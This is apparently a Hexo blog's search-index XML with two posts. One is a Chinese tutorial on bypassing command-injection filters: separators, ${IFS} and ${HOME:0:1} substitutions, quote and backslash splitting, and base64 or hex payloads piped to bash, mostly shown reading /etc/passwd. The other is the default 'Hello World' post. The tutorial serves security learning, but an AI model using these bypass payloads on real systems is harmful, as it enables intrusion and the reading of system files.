<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title></title>
      <link href="/2021/12/14/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E6%8A%80%E6%B3%95/"/>
      <url>/2021/12/14/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E6%8A%80%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<p>—​<br>命令注入绕过技法</p><hr><h3 id="命令分隔符"><a href="#命令分隔符" class="headerlink" title="命令分隔符"></a>命令分隔符</h3><h5 id="cat-etc-passwd-ls"><a href="#cat-etc-passwd-ls" class="headerlink" title="cat /etc/passwd;ls"></a>cat /etc/passwd;ls</h5><p>分号                    ;<br>cmd1;cmd2（多条语句顺序执行）</p><p><img src="C:\Users\82093\AppData\Roaming\Typora\typora-user-images\image-20210708100857571.png" alt="image-20210708100857571"></p><h5 id="cat-etc-passwd-amp-amp-ls"><a href="#cat-etc-passwd-amp-amp-ls" class="headerlink" title="cat /etc/passwd &amp;&amp; ls"></a>cat /etc/passwd &amp;&amp; ls</h5><p>and                &amp;&amp;</p><p>cmd1&amp;&amp;cmd2            与命令，cmd1成功则执行cmd2，cmd1失败则不执行cmd2</p><p><img src="C:\Users\82093\AppData\Roaming\Typora\typora-user-images\image-20210708100821303.png" alt="image-20210708100821303"></p><h5 id="cat-etc-ls"><a href="#cat-etc-ls" class="headerlink" title="cat etc || ls"></a>cat etc || ls</h5><p>or                    ||</p><p>cmd1 || cmd2                    cmd1执行失败则执行cmd2,若cmd1执行成功则不执行cmd2</p><p><img src="C:\Users\82093\AppData\Roaming\Typora\typora-user-images\image-20210708101744281.png" alt="image-20210708101744281"></p><h5 id="管道符"><a href="#管道符" class="headerlink" title="管道符 |"></a>管道符 |</h5><p>|                    管道符<br>管道符”|“左边的命令的输出会作为管道符”|“右边命令的输入</p><h5 id="0a、-0d"><a href="#0a、-0d" class="headerlink" title="%0a、%0d"></a>%0a、%0d</h5><p>linux:<br>%0a                    回车<br>%0d                    换行<br>windows:<br>%0a                    回车<br>%1a                    作为.bat文件的命令分隔符</p><h3 id="过滤空格绕过"><a href="#过滤空格绕过" class="headerlink" title="过滤空格绕过"></a>过滤空格绕过</h3><h5 id="使用-lt-代替空格"><a href="#使用-lt-代替空格" class="headerlink" title="使用&lt;代替空格"></a>使用&lt;代替空格</h5><p>cat /etc/passwd        —-&gt;&gt;&gt;    cat&lt;/etc/passwd</p><p><img src="C:\Users\82093\AppData\Roaming\Typora\typora-user-images\image-20210708102112447.png" alt="image-20210708102112447"></p><h5 id="使用-IFS-代替空格"><a href="#使用-IFS-代替空格" class="headerlink" title="使用${IFS}代替空格"></a>使用${IFS}代替空格</h5><p>cat /etc/passwd        —-&gt;&gt;&gt;    cat${IFS}/etc/passwd</p><p><img src="C:\Users\82093\AppData\Roaming\Typora\typora-user-images\image-20210708102352710.png" alt="image-20210708102352710"></p><h5 id="使用-IFS代替空格"><a href="#使用-IFS代替空格" class="headerlink" title="使用$IFS代替空格"></a>使用$IFS代替空格</h5><p>cat /etc/passwd        —-&gt;&gt;&gt;    cat$IFS/etc/passwd</p><p><img src="C:\Users\82093\AppData\Roaming\Typora\typora-user-images\image-20210708105635651.png" alt="image-20210708105635651"></p><h3 id="过滤斜杠-绕过"><a href="#过滤斜杠-绕过" class="headerlink" title="过滤斜杠/绕过"></a>过滤斜杠/绕过</h3><h5 id="使用-HOME-0-1-代替"><a href="#使用-HOME-0-1-代替" class="headerlink" title="使用${HOME:0:1}代替/"></a>使用${HOME:0:1}代替/</h5><p>cat /etc/passwd        —-&gt;&gt;&gt;    cat ${HOME:0:1}etc${HOME:0:1}passwd</p><p><img src="C:\Users\82093\AppData\Roaming\Typora\typora-user-images\image-20210708112924778.png" alt="image-20210708112924778"></p><h5 id="使用echo-tr-‘-0’-‘“-1’-代替"><a href="#使用echo-tr-‘-0’-‘“-1’-代替" class="headerlink" title="使用echo . | tr ‘!-0’ ‘“-1’ 代替/"></a>使用echo . | tr ‘!-0’ ‘“-1’ 代替/</h5><p>cat /etc/passwd        —-&gt;&gt;&gt;    cat $(echo . | tr ‘!-0’ ‘“-1’)etc$(echo . | tr ‘!-0’ ‘“-1’)passwd<br>注意：反引号``和$()用来表示命令执行,被这两种方式包含的字符串都会被当作命令优先执行<br><img src="C:\Users\82093\AppData\Roaming\Typora\typora-user-images\image-20210708114226675.png" alt="image-20210708114226675"></p><h3 id="黑名单绕过"><a href="#黑名单绕过" class="headerlink" title="黑名单绕过"></a>黑名单绕过</h3><h5 id="拼接绕过"><a href="#拼接绕过" class="headerlink" title="拼接绕过"></a>拼接绕过</h5><p>a=nc1;b=.py;cat $a$b</p><p><img src="C:\Users\82093\AppData\Roaming\Typora\typora-user-images\image-20210708144452553.png" alt="image-20210708144452553"></p><h5 id="单引号‘和双引号“绕过"><a href="#单引号‘和双引号“绕过" class="headerlink" title="单引号‘和双引号“绕过"></a>单引号‘和双引号“绕过</h5><p>cat n’c’1.py</p><p><img src="C:\Users\82093\AppData\Roaming\Typora\typora-user-images\image-20210708144931068.png" alt="image-20210708144931068"></p><p>cat n“c”1.py</p><p><img src="C:\Users\82093\AppData\Roaming\Typora\typora-user-images\image-20210708145032430.png" alt="image-20210708145032430"></p><h5 id="反斜杠-绕过"><a href="#反斜杠-绕过" class="headerlink" title="反斜杠\绕过"></a>反斜杠\绕过</h5><p>cat n\c\1.py</p><p><img src="C:\Users\82093\AppData\Roaming\Typora\typora-user-images\image-20210708145153253.png" alt="image-20210708145153253"></p><h5 id="利用Shell-特殊变量绕过"><a href="#利用Shell-特殊变量绕过" class="headerlink" title="利用Shell 特殊变量绕过"></a>利用Shell 特殊变量绕过</h5><table><thead><tr><th align="left">变量</th><th>含义</th></tr></thead><tbody><tr><td align="left">$0</td><td>当前脚本的文件名</td></tr><tr><td align="left">$n</td><td>传递给脚本或函数的参数。n 是一个数字，表示第几个参数。例如，第一个参数是1，第二个参数是2。而参数不存在时其值为空。</td></tr><tr><td align="left">$#</td><td>传递给脚本或函数的参数个数</td></tr><tr><td align="left">$*</td><td>传递给脚本或函数的所有参数，而参数不存在时其值为空。</td></tr><tr><td align="left">$@</td><td>传递给脚本或函数的所有参数。，而参数不存在时其值为空。被双引号包函时，与$*稍有不同</td></tr><tr><td align="left">$?</td><td>上个命令的推出状态，或函数的返回值</td></tr><tr><td align="left">$$</td><td>当前shell进程ID</td></tr></tbody></table><p>注意：当上述变量的值为空时，使用变量穿插在黑名单字符中即可绕过黑名单限制</p><p><img src="C:\Users\82093\AppData\Roaming\Typora\typora-user-images\image-20210708145832988.png" alt="image-20210708145832988"></p><p><img src="C:\Users\82093\AppData\Roaming\Typora\typora-user-images\image-20210708145858180.png" alt="image-20210708145858180"></p><p><img src="C:\Users\82093\AppData\Roaming\Typora\typora-user-images\image-20210708145940223.png" alt="image-20210708145940223"></p><h5 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h5><p>核心：利用管道符”|“将左边命令的输入作为右边命令的输出</p><p>base64编码绕过</p><p>注意：反引号``和$()用来表示命令执行,被这两种方式包含的字符串都会被当作命令优先执行</p><p>echo “Y2F0IG5jMS5weQ==”|base64 -d|bash</p><p><code>echo Y2F0IG5jMS5weQ== | base64 -d</code></p><p>$(echo Y2F0IG5jMS5weQ== | base64 -d)</p><p>执行顺序：输出base64编码内容——&gt;base64解码其编码内容——&gt;执行bash命令</p><p><img src="C:\Users\82093\AppData\Roaming\Typora\typora-user-images\image-20210708153402371.png" alt="image-20210708153402371"></p><p>16进制编码绕过</p><p>echo “636174206E63312E7079”|xxd -r -p|bash</p><p><img src="C:\Users\82093\AppData\Roaming\Typora\typora-user-images\image-20210708154336924.png" alt="image-20210708154336924"></p><h5 id="通配符绕过"><a href="#通配符绕过" class="headerlink" title="通配符绕过"></a>通配符绕过</h5><table><thead><tr><th>字符</th><th>含义</th></tr></thead><tbody><tr><td>*</td><td>匹配任意长度任意字符</td></tr><tr><td>？</td><td>匹配任意单个字符</td></tr><tr><td></td><td></td></tr></tbody></table><p><img src="C:\Users\82093\AppData\Roaming\Typora\typora-user-images\image-20210708163819674.png" alt="image-20210708163819674"></p><p><img src="C:\Users\82093\AppData\Roaming\Typora\typora-user-images\image-20210708163902064.png" alt="image-20210708163902064"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2021/12/09/hello-world/"/>
      <url>/2021/12/09/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
    
  
</search>
